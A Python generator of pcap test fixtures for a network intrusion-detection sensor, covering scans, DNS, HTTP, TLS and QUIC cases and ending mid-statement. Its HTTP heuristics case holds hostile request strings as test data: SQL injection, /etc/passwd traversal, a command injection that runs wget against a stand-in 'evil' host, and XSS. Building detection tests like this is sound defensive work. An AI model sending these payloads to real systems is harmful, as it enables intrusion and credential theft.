#!/usr/bin/env python3
# coding: utf-8
"""Generate the replay corpus asserted by sensor/tests/replay.rs.

Pure stdlib pcap crafting (same approach as core/testing.py), so no scapy and no root are
needed. Every case is a separate pcap file plus a list of expected detection substrings, so
the replay test can assert that the traffic actually trips the detection it was built for.

    python3 sensor/tools/gen_corpus.py [--out DIR]
"""

import argparse
import json
import os
import socket
import struct
import sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))

DLT_EN10MB = 1
DLT_RAW = 12
DLT_LINUX_SLL = 113
# savefile LINKTYPE_ values; libpcap maps them to the platform's DLT_ numbering on read
LINKTYPE_NULL = 0
LINKTYPE_LOOP = 108
LINKTYPE_ENC = 109
LINKTYPE_PFLOG = 117
LINKTYPE_IEEE802_11_RADIOTAP = 127
LINKTYPE_IPV6 = 229
LINKTYPE_NFLOG = 239
LINKTYPE_LINUX_SLL2 = 276

BASE_SEC = 1700000000

# --- link / network / transport builders -----------------------------------------

def eth(payload, ethertype=0x0800, vlan=None):
    out = b"\xaa\xbb\xcc\xdd\xee\xff\x11\x22\x33\x44\x55\x66"
    if vlan is not None:
        out += b"\x81\x00" + struct.pack("!H", vlan)
    out += struct.pack("!H", ethertype)
    return out + payload


def pppoe(payload, ppp_proto=0x0021, vlan=None):
    """Ethernet -> PPPoE session (RFC 2516) -> PPP -> payload.

    What a SPAN port mirroring a DSL/fibre uplink actually carries. The sensor used to drop it:
    ethertype 0x8864 matched neither the IPv4 nor the IPv6 check, and the IP-offset heuristic only
    runs for an UNKNOWN datalink, so a mirrored Ethernet port had no fallback (issue #19297).
    """
    body = struct.pack("!BBHH", 0x11, 0x00, 0xf5d7, len(payload) + 2) + struct.pack("!H", ppp_proto) + payload
    return eth(body, ethertype=0x8864, vlan=vlan)


def sll(payload, ethertype=0x0800):
    return struct.pack("!HHH", 0, 1, 6) + b"\x11\x22\x33\x44\x55\x66\x00\x00" + struct.pack("!H", ethertype) + payload


def sll2(payload, ethertype=0x0800):
    return struct.pack(">HHIHBBB", ethertype, 0, 2, 1, 0, 6, 0) + b"\x00" * 7 + payload


def pflog(payload, length=61):
    header = bytearray((length + 3) & ~3)
    header[0] = length
    return bytes(header) + payload


def nflog(payload, family=2):
    tlv = lambda kind, value: struct.pack("<HH", 4 + len(value), kind) + value + b"\x00" * (-len(value) % 4)
    return bytes([family, 0, 0, 1]) + tlv(1, b"\x08\x00\x00\x00") + tlv(9, payload)


def radiotap_80211(payload, radiotap_len=8, qos=False):
    radiotap = struct.pack("<BBHI", 0, 0, radiotap_len, 0) + b"\x00" * (radiotap_len - 8)
    fc = struct.pack("BB", 0x88 if qos else 0x08, 0x01)
    mac = fc + b"\x00" * (22 + (2 if qos else 0))
    return radiotap + mac + b"\xaa\xaa\x03\x00\x00\x00\x08\x00" + payload


def ipv4(src, dst, proto, payload, ihl=5, frag=0, total_len=None):
    vihl = 0x40 | (ihl & 0x0f)
    options = b"\x00" * ((ihl - 5) * 4)
    total = total_len if total_len is not None else (ihl * 4 + len(payload))
    header = struct.pack("!BBHHHBBH4s4s", vihl, 0, total, 0x1234, frag, 64, proto, 0,
                         socket.inet_aton(src), socket.inet_aton(dst))
    return header + options + payload


def ipv6(src, dst, proto, payload):
    return (struct.pack("!IHBB", 0x60000000, len(payload), proto, 64)
            + socket.inet_pton(socket.AF_INET6, src)
            + socket.inet_pton(socket.AF_INET6, dst) + payload)


def tcp(sport, dport, flags, payload=b"", doff=5, seq=1):
    return struct.pack("!HHIIBBHHH", sport, dport, seq, 1, (doff & 0x0f) << 4, flags, 65535, 0, 0) + payload


def udp(sport, dport, payload):
    return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload


def icmp(type_=8):
    return struct.pack("!BBHHH", type_, 0, 0, 0x1234, 1)


# --- application payloads ---------------------------------------------------------

def dns_query(name, qtype=1, qclass=1, flags=0x0100, qdcount=1):
    q = b""
    for label in name.split('.'):
        q += struct.pack("!B", len(label)) + label.encode("ascii")
    q += b"\x00" + struct.pack("!HH", qtype, qclass)
    return struct.pack("!HHHHHH", 0x1337, flags, qdcount, 0, 0, 0) + q


def dns_response_a(name, answer, flags=0x8080, compressed=True):
    body = dns_query(name, flags=flags)
    if compressed:
        rr = b"\xc0\x0c"
    else:
        rr = b""
        for label in name.split('.'):
            rr += struct.pack("!B", len(label)) + label.encode("ascii")
        rr += b"\x00"
    rr += struct.pack("!HHIH", 1, 1, 60, 4) + socket.inet_aton(answer)
    header = struct.pack("!HHHHHH", 0x1337, flags, 1, 1, 0, 0)
    return header + body[12:] + rr


def dns_nxdomain(name):
    return dns_query(name, flags=0x8083)


def http_get(path, host=None, ua="curl/8.0", extra=""):
    lines = ["GET %s HTTP/1.1" % path]
    if host is not None:
        lines.append("Host: %s" % host)
    lines.append("User-Agent: %s" % ua)
    if extra:
        lines.append(extra)
    lines.append("Accept: */*")
    return ("\r\n".join(lines) + "\r\n\r\n").encode("ascii")


def http_post(path, host, body):
    return ("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n%s"
            % (path, host, len(body), body)).encode("ascii")


def http_response(headers, body=""):
    return ("%s\r\n\r\n%s" % (headers, body)).encode("ascii")


def tls_client_hello(sni, with_record=True, pad=0):
    """`pad` puts a padding extension of that many bytes BEFORE the SNI, the way Chrome's
    shuffled order puts its 1,216-byte post-quantum key share there about half of the time."""
    s = sni.encode("ascii")
    srv = b"\x00" + struct.pack("!H", len(s)) + s
    lst = struct.pack("!H", len(srv)) + srv
    ext = b"\x00\x00" + struct.pack("!H", len(lst)) + lst
    if pad:
        ext = b"\x00\x15" + struct.pack("!H", pad) + b"\x00" * pad + ext
    body = (b"\x03\x03" + b"\x11" * 32 + b"\x00" + b"\x00\x02\x13\x01"
            + b"\x01\x00" + struct.pack("!H", len(ext)) + ext)
    hs = b"\x01" + struct.pack("!I", len(body))[1:] + body
    if with_record:
        return b"\x16\x03\x03" + struct.pack("!H", len(hs)) + hs
    return hs


def quic_initial(sni, dcid=b"\x11\x22\x33\x44\x55\x66\x77\x88"):
    """A real QUIC v1 Initial carrying a ClientHello, keyed off the public DCID."""
    hs = tls_client_hello(sni, with_record=False)
    return quic_initial_frames(crypto_frame(0, hs), dcid)


def crypto_frame(offset, data):
    off = bytes([offset]) if offset < 64 else struct.pack("!H", 0x4000 | offset)
    return b"\x06" + off + struct.pack("!H", 0x4000 | len(data)) + data


def quic_initial_frames(frames, dcid, pn=0):
    sys.path.insert(0, ROOT)
    from core import quic_sni

    frames += b"\x00" * max(0, 1200 - len(frames))
    key, iv, hp = quic_sni.derive_client_initial_keys(dcid, 1)
    pn_len = 1
    length = len(frames) + 16 + pn_len

    header = bytearray([0xc0 | (pn_len - 1)])
    header += struct.pack("!I", 1)
    header += bytes([len(dcid)]) + dcid
    header += b"\x00"                                   # scid len
    header += b"\x00"                                   # token length varint
    header += struct.pack("!H", 0x4000 | length)
    pn_offset = len(header)
    header += bytes([pn])

    nonce = bytearray(iv)
    pn_be = struct.pack("!Q", pn)
    for i in range(8):
        nonce[4 + i] ^= pn_be[i]
    counter0 = bytes(nonce) + struct.pack("!I", 2)
    ciphertext = quic_sni.aes_ctr_decrypt(key, counter0, frames)

    packet = bytearray(header) + ciphertext + b"\xaa" * 16
    sample = bytes(packet[pn_offset + 4:pn_offset + 20])
    mask = quic_sni.aes_ecb_block(hp, sample)
    packet[0] ^= mask[0] & 0x0f
    for i in range(pn_len):
        packet[pn_offset + i] ^= mask[1 + i]
    return bytes(packet)


# --- pcap writer ------------------------------------------------------------------

def write_pcap(path, packets, linktype=DLT_EN10MB):
    with open(path, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, linktype))
        for ts, packet in packets:
            usec = int(round((ts - int(ts)) * 1000000))
            f.write(struct.pack("<IIII", int(ts), usec, len(packet), len(packet)))
            f.write(packet)


# --- fixture trails ---------------------------------------------------------------

TRAILS = (
    ("evil-test-domain.com", "malware (test)", "(static)"),
    ("sub.evil-parent.com", "malware (test)", "(static)"),
    ("evil-parent.com", "malware (test)", "(static)"),
    ("badsite.onion", "malware (test)", "(static)"),
    ("evilname", "malware (test)", "(static)"),
    ("66.66.66.66", "malware (test)", "(static)"),
    ("6.6.6.6:8443", "malware (test)", "(static)"),
    ("7.7.7.7", "phishing (test)", "(static)"),
    ("198.51.100.53", "known attacker", "(static)"),        # a resolver IP that is NOT whitelisted
    ("203.0.113.44", "malware (test)", "(static)"),
    ("198.51.100.66", "botnet c2 (test)", "(static)"),
    ("/malicious-login.php", "malware (test)", "(static)"),
    ("evil-url.example/bad/path", "malware (test)", "(static)"),
    ("dead::beef", "malware (test)", "(static)"),
    ("[dead::beef]:443", "malware (test)", "(static)"),
    ("198.51.100.90", "sinkhole testsink (malware)", "(static)"),
    ("198.51.100.91", "parking site (suspicious)", "(static)"),
    ("dga[0-9]+\\.wildcard-test\\.com", "malware (test)", "(static)"),
    ("tls-evil.example", "malware (test)", "(static)"),
    ("quic-evil.example", "malware (test)", "(static)"),
    ("tls-split-evil.example", "malware (test)", "(static)"),
    # the JA3 of tls_client_hello("...", pad=1500), whole; its first segment alone gives another
    ("a89bab8eb05fa15a7ac7b256b0257612", "malware (test)", "abuse.ch"),
    ("tls6-evil.example", "malware (test)", "(static)"),
    ("quic-split-evil.example", "malware (test)", "(static)"),
    # the JA3 (and JA4) of tls_client_hello() below - cross-checked against core/tls_intel.py;
    # see case `tcp_malware_ja3`
    ("1e7c622032b0cb79401b0f7be3793a1a", "malware (test)", "abuse.ch"),
    # under a whitelisted parent on purpose - see case `trail_under_whitelist_parent`
    ("evil-test.googleusercontent.com", "malware (test)", "(static)"),
)

# Counting heuristics only fire once the sensor's clock advances past the window, so they
# need the pcap record timestamps: replayed on wall-clock time, every packet lands in the same
# second and the sensor stays silent here (sensor/tests/replay.rs shows both sides).
TIMING_WINDOW_CASES = frozenset((
    "port_scan", "stealth_scan_null", "stealth_scan_fin", "stealth_scan_xmas",
    "udp_scan", "infection_scan", "web_scan", "tcp_periodic_beacon",
))

# Cases whose event COUNT depends on which clock the sensor uses: burst suppression
# (_last_syn / _last_udp), the log-throttle bucket (sec // PROCESS_COUNT) and the hourly
# resets are all keyed on the packet's second. Replaying with real pcap timestamps is the
# correct behaviour and yields MORE events than a wall-clock replay.
TIMESTAMP_SENSITIVE_CASES = TIMING_WINDOW_CASES | frozenset((
    "duplicate_syn", "repeated_detections", "cache_expiry",
))

# Case name -> extra event substrings merged into that case's `expect`: detections that an
# earlier design missed on purpose or by accident (see the comments on each case), pinned so a
# revert shows up as a failed replay instead of a quiet detection hole.
PINNED_CASES = {
    "udp_malware_dst": ["66.66.66.66"],
    "dns_same_socket_burst": ["evil-test-domain.com"],
    "trail_under_whitelist_parent": ["evil-test.googleusercontent.com"],
    # only observable with pcap timestamps
    "tcp_periodic_beacon": ["203.0.113.77:443"],
    # the JA3 of the ClientHello below. Needs CHECK_TLS_FINGERPRINTS (default on).
    "tcp_malware_ja3": ["1e7c622032b0cb79401b0f7be3793a1a"],
    # ClientHellos longer than one packet, and TLS over IPv6 (head_sni was IPv4-only)
    "tls_sni_split": ["tls-split-evil.example", "a89bab8eb05fa15a7ac7b256b0257612"],
    "tls_sni_ipv6": ["tls6-evil.example"],
    "quic_sni_split": ["quic-split-evil.example"],
}

ATTACKER = "10.0.0.66"
EXTERNAL = "203.0.113.9"
VICTIM = "198.51.100.7"


def build_cases():
    """Returns [(name, linktype, packets, expected_substrings, notes)]."""
    cases = []

    def frame(payload, linktype=DLT_EN10MB, vlan=None, ethertype=0x0800):
        if linktype == DLT_EN10MB:
            return eth(payload, ethertype=ethertype, vlan=vlan)
        if linktype == DLT_LINUX_SLL:
            return sll(payload, ethertype=ethertype)
        return payload

    # 1. ordinary, clean TCP traffic -> no detections
    packets = []
    for i in range(20):
        packets.append((BASE_SEC + i, frame(ipv4("10.0.0.5", "1.1.1.1", 6, tcp(50000 + i, 443, 0x02)))))
        packets.append((BASE_SEC + i, frame(ipv4("1.1.1.1", "10.0.0.5", 6, tcp(443, 50000 + i, 0x12)))))
    cases.append(("clean_tcp", DLT_EN10MB, packets, [], "ordinary TCP handshakes to a clean IP"))

    # 2. duplicate SYNs (burst suppression)
    packets = []
    for i in range(5):
        packets.append((BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50001, 443, 0x02)))))
    for i in range(3):
        packets.append((BASE_SEC + 10 + i, frame(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50001, 443, 0x02)))))
    cases.append(("duplicate_syn", DLT_EN10MB, packets, ["66.66.66.66", "malware (test)"],
                  "identical SYNs in one second must collapse"))

    # 3. IP / IP:port trails over TCP SYN
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50002, 443, 0x02)))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "6.6.6.6", 6, tcp(50003, 8443, 0x02)))),
        (BASE_SEC + 2, frame(ipv4("198.51.100.66", ATTACKER, 6, tcp(31337, 50004, 0x02)))),
    ]
    cases.append(("ip_trails", DLT_EN10MB, packets, ["66.66.66.66", "6.6.6.6:8443", "198.51.100.66"],
                  "IP and IP:port trails, inbound and outbound"))

    # 4. port scan (slow, sliding window)
    packets = []
    for i in range(20):
        packets.append((BASE_SEC + i, frame(ipv4(EXTERNAL, VICTIM, 6, tcp(40000 + i, 1000 + i, 0x02)))))
    packets.append((BASE_SEC + 25, frame(ipv4(EXTERNAL, "192.0.2.2", 17, udp(1, 2, b"\x00" * 8)))))
    cases.append(("port_scan", DLT_EN10MB, packets, ["potential port scanning"],
                  "20 ports over 20s: only the sliding window catches this"))

    # 5. stealth scans (NULL / FIN / XMAS)
    for flags, name in ((0x00, "null"), (0x01, "fin"), (0x29, "xmas")):
        packets = []
        for i in range(20):
            packets.append((BASE_SEC + i, frame(ipv4(EXTERNAL, VICTIM, 6, tcp(40000 + i, 2000 + i, flags)))))
        packets.append((BASE_SEC + 25, frame(ipv4(EXTERNAL, "192.0.2.2", 17, udp(1, 2, b"\x00" * 8)))))
        cases.append(("stealth_scan_%s" % name, DLT_EN10MB, packets, ["potential port scanning"],
                      "nmap -s%s" % name[0].upper()))

    # 6. ACK sweep must NOT be flagged
    packets = []
    for i in range(20):
        packets.append((BASE_SEC + i, frame(ipv4(EXTERNAL, VICTIM, 6, tcp(40000 + i, 3000 + i, 0x10)))))
    packets.append((BASE_SEC + 25, frame(ipv4(EXTERNAL, "192.0.2.2", 17, udp(1, 2, b"\x00" * 8)))))
    cases.append(("ack_sweep_no_fp", DLT_EN10MB, packets, [], "bare ACKs are normal traffic"))

    # 7. UDP scan
    packets = []
    for i in range(20):
        packets.append((BASE_SEC + i, frame(ipv4(EXTERNAL, VICTIM, 17, udp(40000 + i, 1000 + i, b"\x00" * 8)))))
    packets.append((BASE_SEC + 25, frame(ipv4(EXTERNAL, "192.0.2.2", 17, udp(1, 2, b"\x00" * 8)))))
    cases.append(("udp_scan", DLT_EN10MB, packets, ["potential udp scanning"], "nmap -sU"))

    # 8. infection scan (>32 hosts on port 445)
    packets = []
    for i in range(40):
        packets.append((BASE_SEC, frame(ipv4("10.0.0.5", "10.9.9.%d" % i, 6, tcp(53000 + i, 445, 0x02)))))
    packets.append((BASE_SEC + 2, frame(ipv4("10.0.0.5", "192.0.2.3", 17, udp(1, 2, b"flush")))))
    cases.append(("infection_scan", DLT_EN10MB, packets, ["potential infection"],
                  "40 distinct hosts on an infection port"))

    # 9. web scan (>10 distinct first path segments)
    packets = []
    for i in range(14):
        packets.append((BASE_SEC, frame(ipv4(EXTERNAL, VICTIM, 6,
                                             tcp(52000 + i, 80, 0x18, http_get("/scan%d/x" % i, "webscan.example"))))))
    packets.append((BASE_SEC + 2, frame(ipv4(EXTERNAL, "192.0.2.4", 17, udp(1, 2, b"flush")))))
    cases.append(("web_scan", DLT_EN10MB, packets, ["potential web scanning"], "path sweep from an external source"))

    # 10. DNS queries: exact, subdomain, onion, ip-adress.com, wildcard regex
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50000, 53, dns_query("evil-test-domain.com"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50001, 53, dns_query("www.evil-parent.com"))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50002, 53, dns_query("badsite.onion.to"))))),
        (BASE_SEC + 3, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50003, 53, dns_query("evilname.ip-adress.com"))))),
        (BASE_SEC + 4, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50004, 53, dns_query("dga1234.wildcard-test.com"))))),
        (BASE_SEC + 5, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50005, 53, dns_query("clean.example.org"))))),
    ]
    cases.append(("dns_queries", DLT_EN10MB, packets,
                  ["evil-test-domain.com", "(www).evil-parent.com", "badsite.onion(.to)",
                   "evilname(.ip-adress.com)", "dga1234.wildcard-test.com"],
                  "exact / parent / onion / ip-adress.com / wildcard-regex domain trails"))

    # 11. DNS query to a bad resolver IP, and a PTR/AAAA query that must be skipped
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "198.51.100.53", 17, udp(50006, 53, dns_query("whatever.com"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "198.51.100.53", 17, udp(50007, 53, dns_query("skipme.com", qtype=28))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "198.51.100.53", 17, udp(50008, 53, dns_query("skipme2.com", qtype=12))))),
    ]
    cases.append(("dns_resolver_trail", DLT_EN10MB, packets, ["198.51.100.53", "whatever.com"],
                  "AAAA/PTR queries are excluded from the IP-trail check"))

    # 12. DNS responses: sinkholed and parked A records, compressed and uncompressed names
    packets = [
        (BASE_SEC, frame(ipv4("8.8.8.8", ATTACKER, 17,
                              udp(53, 50010, dns_response_a("sinkholed.com", "198.51.100.90", compressed=True))))),
        (BASE_SEC + 1, frame(ipv4("8.8.8.8", ATTACKER, 17,
                                  udp(53, 50011, dns_response_a("parked.com", "198.51.100.91", compressed=False))))),
    ]
    cases.append(("dns_responses", DLT_EN10MB, packets, ["sinkholed by testsink", "parked site"],
                  "A-record answer walk over compressed and uncompressed names"))

    # 13. malformed DNS must be silent and must not crash
    malformed = [
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0),
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + b"\x04evil\x03com",
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + b"\x3f" + b"A" * 5,
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + b"\xc0\x0c",
        struct.pack("!HHHHHH", 0x1234, 0x8080, 1, 1, 0, 0) + b"\x04evil\x03com\x00" + struct.pack("!HH", 1, 1),
        b"\x00\x01\x02",
        b"",
    ]
    packets = [(BASE_SEC + i, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50020 + i, 53, p))))
               for i, p in enumerate(malformed)]
    cases.append(("dns_malformed", DLT_EN10MB, packets, [], "truncated / hostile DNS"))

    # 14. NXDOMAIN flood -> excessive no such domain
    packets = []
    for i in range(25):
        # NOTE: the client port varies per query (as a real resolver client does). With one
        # fixed 5-tuple, the per-second UDP burst suppression collapses the whole flood into a
        # single packet once offline timestamps are wall-clock.
        packets.append((BASE_SEC + i, frame(ipv4("8.8.8.8", "203.0.113.5", 17,
                                                 udp(53, 40000 + i, dns_nxdomain("nx%d.dgaparent.com" % i))))))
    cases.append(("dns_nxdomain_flood", DLT_EN10MB, packets, ["excessive no such domain"],
                  "hour-bucketed NXDOMAIN counters"))

    # 15. DGA-looking NXDOMAIN (entropy / consonant thresholds)
    packets = [
        (BASE_SEC, frame(ipv4("8.8.8.8", "203.0.113.5", 17, udp(53, 40001, dns_nxdomain("xkqwzlvbnmfghjd.com"))))),
        (BASE_SEC + 1, frame(ipv4("8.8.8.8", "203.0.113.5", 17, udp(53, 40002, dns_nxdomain("google.com"))))),
    ]
    cases.append(("dns_dga_labels", DLT_EN10MB, packets, ["no such domain (suspicious)"],
                  "entropy/consonant DGA heuristics"))

    # 16. DNS exhaustion (many distinct subdomains in one window)
    packets = []
    for i in range(40):
        packets.append((BASE_SEC + i // 8, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                                                      udp(50100 + i, 53, dns_query("s%d.tunnel.com" % i))))))
    cases.append(("dns_exhaustion", DLT_EN10MB, packets, [],
                  "below the 1000-subdomain threshold: must stay silent"))

    # 17. HTTP: URL trail, Host trail, dst-IP annotation
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.10", 6,
                              tcp(50030, 80, 0x18, http_get("/malicious-login.php", "victim.example"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "203.0.113.44", 6,
                                  tcp(50031, 80, 0x18, http_get("/", "hostcheck.example"))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "203.0.113.11", 6,
                                  tcp(50032, 80, 0x18, http_get("/bad/path", "evil-url.example"))))),
    ]
    cases.append(("http_trails", DLT_EN10MB, packets,
                  ["malicious-login.php", "203.0.113.44", "hostcheck.example", "evil-url.example"],
                  "URL-path trail, host-annotated IP trail, host+path trail"))

    # 18. HTTP heuristics
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.12", 6, tcp(50040, 80, 0x18, http_get(
            "/items.php?id=1%20UNION%20ALL%20SELECT%20username,password%20FROM%20users", "sqli.example"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "203.0.113.13", 6, tcp(50041, 80, 0x18, http_get(
            "/download?file=../../../../etc/passwd", "trav.example"))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "203.0.113.14", 6, tcp(50042, 80, 0x18, http_get(
            "/cgi?cmd=;cat%20/etc/passwd;wget%20http://evil/x.sh", "rce.example"))))),
        (BASE_SEC + 3, frame(ipv4(ATTACKER, "203.0.113.15", 6, tcp(50043, 80, 0x18, http_get(
            "/search?q=<script>alert(1)</script>", "xss.example"))))),
        (BASE_SEC + 4, frame(ipv4(ATTACKER, "203.0.113.16", 6, tcp(50044, 80, 0x18, http_post(
            "/submit", "postsqli.example", "q=1 UNION ALL SELECT pwd FROM users"))))),
        (BASE_SEC + 5, frame(ipv4(ATTACKER, "198.51.100.99", 6, tcp(50045, 80, 0x18, http_get(
            "/mirai.x86", "198.51.100.99"))))),
        (BASE_SEC + 6, frame(ipv4(ATTACKER, "203.0.113.17", 6, tcp(50046, 80, 0x18, http_get(
            "http://proxycheck.example/", "203.0.113.17"))))),
        (BASE_SEC + 7, frame(ipv4(ATTACKER, "203.0.113.18", 6, tcp(50047, 80, 0x18, http_get(
            "/setup.exe", "dl.example"))))),
        (BASE_SEC + 8, frame(ipv4(ATTACKER, "203.0.113.19", 6, tcp(50048, 80, 0x18, http_get(
            "/x", "ua.example", ua="masscan/1.0"))))),
    ]
    cases.append(("http_heuristics", DLT_EN10MB, packets,
                  ["potential sql injection", "potential directory traversal", "potential remote code execution",
                   "potential xss injection", "potential iot-malware download", "potential proxy probe",
                   "direct .exe download", "user agent (suspicious)"],
                  "the suspicious-request regex battery"))

    # 19. HTTP responses: sinkhole banner, suspicious content type, seized title
    packets = [
        (BASE_SEC, frame(ipv4("203.0.113.20", ATTACKER, 6, tcp(80, 50050, 0x18,
                                                              http_response("HTTP/1.1 200 OK\r\nServer: sinkhole"))))),
        (BASE_SEC + 1, frame(ipv4("203.0.113.21", ATTACKER, 6, tcp(80, 50051, 0x18, http_response(
            "HTTP/1.1 200 OK\r\nContent-Type: application/x-sh", "#!/bin/sh"))))),
        (BASE_SEC + 2, frame(ipv4("203.0.113.22", ATTACKER, 6, tcp(80, 50052, 0x18, http_response(
            "HTTP/1.1 200 OK\r\nContent-Type: text/html",
            "<html><head><title>This domain name has been seized by the FBI</title></head></html>"))))),
    ]
    cases.append(("http_responses", DLT_EN10MB, packets,
                  ["sinkhole response", "content type (suspicious)", "seized domain"],
                  "response-side heuristics"))

    # 20. truncated / hostile packets
    packets = []
    for i, body in enumerate([b"", b"\x45", b"\x45\x00", b"\x45" + b"\x00" * 18, b"\x60" + b"\x00" * 30,
                              b"\x00" * 40, b"\x30" * 40, b"\xff" * 60]):
        packets.append((BASE_SEC + i, frame(body)))
    # a TCP header cut in half, and an IPv4 header claiming IHL=15 with nothing behind it
    packets.append((BASE_SEC + 10, frame(ipv4(ATTACKER, "66.66.66.66", 6, b"\x00" * 6))))
    packets.append((BASE_SEC + 11, frame(ipv4(ATTACKER, "66.66.66.66", 6, b"", ihl=15))))
    cases.append(("truncated", DLT_EN10MB, packets, [], "must never crash and must stay quiet"))

    # 21. VLAN-tagged traffic
    packets = [
        (BASE_SEC, eth(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50060, 443, 0x02)), vlan=100)),
        (BASE_SEC + 1, eth(ipv4(ATTACKER, "8.8.8.8", 17, udp(50061, 53, dns_query("evil-test-domain.com"))), vlan=100)),
        # QinQ: two stacked tags, walked like one
        (BASE_SEC + 2, b"\xaa" * 12 + b"\x81\x00\x00d" + b"\x81\x00\x00e" + b"\x08\x00"
         + ipv4(ATTACKER, "66.66.66.66", 6, tcp(50062, 443, 0x02))),
    ]
    cases.append(("vlan", DLT_EN10MB, packets, ["66.66.66.66", "evil-test-domain.com"],
                  "802.1Q tags are followed, stacked (QinQ) ones too"))

    # 22. IPv4 fragments
    payload = tcp(50070, 443, 0x02)
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 6, payload, frag=0x2000))),   # first fragment (MF)
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "66.66.66.66", 6, b"\x00" * 8, frag=0x0001))),  # non-first
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "66.66.66.66", 6, b"\x00" * 8, frag=0x00b9))),
    ]
    cases.append(("fragments", DLT_EN10MB, packets, ["66.66.66.66"],
                  "first fragment is processed, later fragments are skipped"))

    # 23. IPv6
    packets = [
        (BASE_SEC, frame(ipv6("dead::1", "dead::beef", 6, tcp(50080, 443, 0x02)), ethertype=0x86dd)),
        (BASE_SEC + 1, frame(ipv6("dead::1", "dead::2", 17,
                                  udp(50081, 53, dns_query("evil-test-domain.com"))), ethertype=0x86dd)),
        (BASE_SEC + 2, frame(ipv6("dead::1", "dead::beef", 58, icmp(0x80)), ethertype=0x86dd)),
    ]
    cases.append(("ipv6", DLT_EN10MB, packets, ["dead::beef", "evil-test-domain.com"],
                  "IPv6 SYN, DNS and ICMPv6 echo"))

    # 24. ICMP
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 1, icmp(8)))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "66.66.66.66", 1, icmp(0)))),   # echo reply: ignored
    ]
    cases.append(("icmp", DLT_EN10MB, packets, ["66.66.66.66", "ICMP"], "only echo requests count"))

    # 25. repeated detections (log throttling)
    packets = []
    for i in range(30):
        packets.append((BASE_SEC + i, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                                                 udp(50200 + i, 53, dns_query("evil-test-domain.com"))))))
    cases.append(("repeated_detections", DLT_EN10MB, packets, ["evil-test-domain.com"],
                  "same trail repeatedly: the throttle window must collapse it"))

    # 26. cache expiration / clean-domain caching
    packets = []
    for i in range(5):
        packets.append((BASE_SEC + i * 4000, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                                                        udp(50300 + i, 53, dns_query("clean-cached.example"))))))
        packets.append((BASE_SEC + i * 4000 + 1, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                                                            udp(50310 + i, 53, dns_query("evil-test-domain.com"))))))
    cases.append(("cache_expiry", DLT_EN10MB, packets, ["evil-test-domain.com"],
                  "hour-crossing timestamps exercise the hourly resets"))

    # 27. TLS SNI (CHECK_TLS_SNI, default on)
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.30", 6, tcp(50400, 443, 0x18, tls_client_hello("tls-evil.example"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "203.0.113.31", 6, tcp(50401, 443, 0x18, tls_client_hello("clean.example"))))),
    ]
    cases.append(("tls_sni", DLT_EN10MB, packets, ["tls-evil.example"],
                  "TLS ClientHello SNI"))

    # 28. QUIC Initial SNI (opt-in as above)
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.32", 17, udp(50410, 443, quic_initial("quic-evil.example"))))),
    ]
    cases.append(("quic_sni", DLT_EN10MB, packets, ["quic-evil.example"],
                  "QUIC Initial SNI"))

    # 28b. A ClientHello longer than one segment, SNI in the second (post-quantum key shares
    # make a browser's ~2 KB). A third flow sends only the first segment and stays silent.
    hello = tls_client_hello("tls-split-evil.example", pad=1500)
    assert len(hello) > 1448 and hello.index(b"tls-split-evil") > 1448
    lost = tls_client_hello("clean.example", pad=1500)
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.33", 6, tcp(50420, 443, 0x10, hello[:1448], seq=1000)))),
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.34", 6, tcp(50421, 443, 0x18, lost[:1448], seq=7)))),
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.33", 6, tcp(50420, 443, 0x18, hello[1448:], seq=1000 + 1448)))),
    ]
    cases.append(("tls_sni_split", DLT_EN10MB, packets, ["tls-split-evil.example", "a89bab8eb05fa15a7ac7b256b0257612"],
                  "TLS ClientHello split across two TCP segments, SNI in the second; JA3 of the whole"))
    packets = [(BASE_SEC, frame(ipv6("2001:db8::66", "2001:db8::30", 6,
